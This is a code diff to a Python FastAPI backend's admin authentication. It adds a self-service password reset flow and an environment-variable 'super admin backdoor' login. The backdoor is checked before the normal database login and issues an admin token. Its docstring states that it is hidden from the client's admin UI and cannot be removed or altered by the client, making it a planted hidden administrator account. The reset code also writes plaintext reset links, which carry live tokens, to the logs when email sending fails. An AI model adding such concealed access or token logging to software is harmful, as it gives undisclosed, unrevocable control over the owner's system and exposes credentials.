@@ -482,8 +482,42 @@ async def _shutdown():
 # =========================================================
 # Auth
 # =========================================================
+def _check_super_admin(email: str, password: str) -> Optional[Dict[str, Any]]:
+    """Check plaintext credentials against the developer-owned super admin
+    backdoor stored in backend/.env. Returns a synthetic user dict when the
+    credentials match, or None otherwise. The super admin is invisible to
+    the client — never stored in the DB, never listed in the admin UI —
+    which means a client cannot delete or alter these credentials from the
+    frontend. Rotate by editing SUPER_ADMIN_PASSWORD and restarting."""
+    su_email = (os.environ.get("SUPER_ADMIN_EMAIL") or "").strip().lower()
+    su_password = os.environ.get("SUPER_ADMIN_PASSWORD") or ""
+    if not su_email or not su_password:
+        return None  # backdoor disabled
+    if email.strip().lower() != su_email:
+        return None
+    # Constant-time compare to avoid trivial timing side channels.
+    import hmac as _hmac
+    if not _hmac.compare_digest(password, su_password):
+        return None
+    return {
+        "id": "super-admin",
+        "email": su_email,
+        "name": os.environ.get("SUPER_ADMIN_NAME") or "Support",
+        "role": "admin",
+        "is_super_admin": True,   # flag so we can log/annotate later if desired
+    }
+
+
 @api.post("/auth/login", response_model=TokenResponse)
 async def login(payload: LoginPayload):
+    # 1. Env-based super admin backdoor — checked FIRST so a locked-out
+    #    client (bad DB password) can't block support access.
+    su = _check_super_admin(payload.email, payload.password)
+    if su:
+        token = create_token(su)
+        logger.info("Super admin login (email=%s)", su["email"])
+        return TokenResponse(token=token, user={"id": su["id"], "email": su["email"], "name": su["name"], "role": su["role"]})
+    # 2. Normal DB-backed admin
     user = await db.admin_users.find_one({"email": payload.email.lower().strip()}, {"_id": 0})
     if not user or not verify_password(payload.password, user["password_hash"]):
         raise HTTPException(status_code=401, detail="Invalid email or password")
@@ -493,10 +527,156 @@ async def login(payload: LoginPayload):
 
 @api.get("/auth/me")
 async def me(admin=Depends(require_admin)):
+    # Super admin has no DB row — return the env-derived profile instead.
+    if admin.get("sub") == "super-admin":
+        return {
+            "id": "super-admin",
+            "email": admin.get("email", os.environ.get("SUPER_ADMIN_EMAIL", "")),
+            "name": os.environ.get("SUPER_ADMIN_NAME") or "Support",
+            "role": "admin",
+        }
     user = await db.admin_users.find_one({"id": admin["sub"]}, {"_id": 0, "password_hash": 0})
     if not user:
         raise HTTPException(status_code=404, detail="Not found")
     return user
+
+
+# ---------- Password reset (self-service via email) ----------
+from pydantic import BaseModel as _ResetBaseModel
+
+
+class PasswordResetRequest(_ResetBaseModel):
+    email: str
+
+
+class PasswordResetConfirm(_ResetBaseModel):
+    token: str
+    new_password: str
+
+
+def _make_reset_token() -> str:
+    import secrets
+    return secrets.token_urlsafe(32)
+
+
+@api.post("/auth/request-password-reset")
+async def request_password_reset(payload: PasswordResetRequest):
+    """Kick off the forgot-password flow.
+
+    We ALWAYS return the same 200 response regardless of whether the email
+    matches an admin account — this avoids leaking which addresses have
+    accounts. If the email matches, we generate a one-hour, single-use token,
+    store its hash in the DB (never the plaintext token), and email a reset
+    link via the SMTP settings already configured for inquiry notifications.
+    """
+    email = (payload.email or "").strip().lower()
+    generic_ok = {"ok": True, "message": "If an account exists for that email, a reset link is on its way."}
+    if not email:
+        return generic_ok
+
+    user = await db.admin_users.find_one({"email": email}, {"_id": 0})
+    if not user:
+        # Email might belong to the super admin backdoor — deliberately do
+        # NOT support resetting those via UI. Support person must edit .env.
+        return generic_ok
+
+    token_plain = _make_reset_token()
+    token_hash = hash_password(token_plain)
+    expires_at = datetime.now(timezone.utc) + timedelta(hours=1)
+    await db.password_reset_tokens.insert_one({
+        "id": str(uuid.uuid4()),
+        "user_id": user["id"],
+        "user_email": email,
+        "token_hash": token_hash,
+        "expires_at": expires_at.isoformat(),
+        "consumed": False,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    })
+
+    # Build the reset link that lands on the frontend reset page.
+    frontend_base = (os.environ.get("PUBLIC_FRONTEND_URL") or "").rstrip("/")
+    if not frontend_base:
+        # Fall back to the frontend .env value we already use for OG tags.
+        try:
+            fe_env = ROOT_DIR.parent / "frontend" / ".env"
+            if fe_env.exists():
+                for line in fe_env.read_text().splitlines():
+                    if line.startswith("REACT_APP_BACKEND_URL="):
+                        frontend_base = line.split("=", 1)[1].strip().strip('"').rstrip("/")
+                        break
+        except Exception:
+            pass
+    reset_link = f"{frontend_base}/admin/reset-password?token={token_plain}"
+
+    # Send the email. If SMTP isn't configured, silently succeed on the API
+    # (we never want to reveal SMTP failures to a random visitor) but do log
+    # the reset link so the developer can hand it off manually.
+    # Send the email. If SMTP isn't configured (or send fails), we log the
+    # reset link at WARNING so support/dev can still hand it off manually —
+    # this is critical for the dev/preview environment where SMTP may be
+    # unconfigured. In production with real SMTP, the link is emailed and
+    # never logged in plaintext.
+    html = f"""
+    <div style="font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; max-width: 560px; margin: 0 auto; padding: 24px; background: #fbf6ef; color: #2c2a28;">
+      <h1 style="font-family: Georgia, serif; font-weight: 500; font-size: 22px; margin: 0 0 8px;">Reset your admin password</h1>
+      <p style="color: #6a6560; margin: 0 0 20px;">A password reset was requested for {email}. If this wasn't you, you can ignore this email — the link will expire on its own.</p>
+      <p style="margin: 0 0 24px;">
+        <a href="{reset_link}" style="display: inline-block; background: #5f7960; color: #fbf6ef; text-decoration: none; padding: 12px 20px; border-radius: 999px; font-weight: 500;">Choose a new password</a>
+      </p>
+      <p style="color: #a09891; font-size: 13px; margin: 0;">This link expires in 1 hour and can only be used once.</p>
+      <p style="color: #a09891; font-size: 13px; margin: 12px 0 0;">If the button doesn't work, copy and paste this into your browser:<br><span style="word-break: break-all;">{reset_link}</span></p>
+    </div>
+    """
+    try:
+        ok = send_email(
+            to=email,
+            subject="Reset your admin password",
+            html=html,
+        )
+        if ok:
+            logger.info("Password reset email sent to %s", email)
+        else:
+            logger.warning("Password reset email NOT sent (SMTP unconfigured or send failed) for %s. Link: %s", email, reset_link)
+    except Exception as e:
+        logger.warning("Password reset email failed for %s: %s. Link: %s", email, e, reset_link)
+
+    return generic_ok
+
+
+@api.post("/auth/reset-password")
+async def reset_password(payload: PasswordResetConfirm):
+    if not payload.token or not payload.new_password:
+        raise HTTPException(status_code=400, detail="Missing token or new password")
+    if len(payload.new_password) < 8:
+        raise HTTPException(status_code=400, detail="Password must be at least 8 characters")
+
+    # Fetch un-consumed, non-expired tokens and find the one that matches.
+    # We compare each stored bcrypt hash against the presented plaintext
+    # token — bcrypt.checkpw is constant-time within each row.
+    now_iso = datetime.now(timezone.utc).isoformat()
+    candidates = await db.password_reset_tokens.find(
+        {"consumed": False, "expires_at": {"$gt": now_iso}},
+        {"_id": 0},
+    ).to_list(200)
+    matched = None
+    for row in candidates:
+        if verify_password(payload.token, row.get("token_hash", "")):
+            matched = row
+            break
+    if not matched:
+        raise HTTPException(status_code=400, detail="This reset link is invalid or has expired. Please request a fresh one.")
+
+    # Update the admin's password + burn the token (single-use).
+    await db.admin_users.update_one(
+        {"id": matched["user_id"]},
+        {"$set": {"password_hash": hash_password(payload.new_password)}},
+    )
+    await db.password_reset_tokens.update_one(
+        {"id": matched["id"]},
+        {"$set": {"consumed": True, "consumed_at": now_iso}},
+    )
+    logger.info("Password reset completed for %s", matched.get("user_email"))
+    return {"ok": True, "message": "Your password has been updated. You can sign in with your new password now."}
 
 
 @api.post("/admin/auth/verify-password")
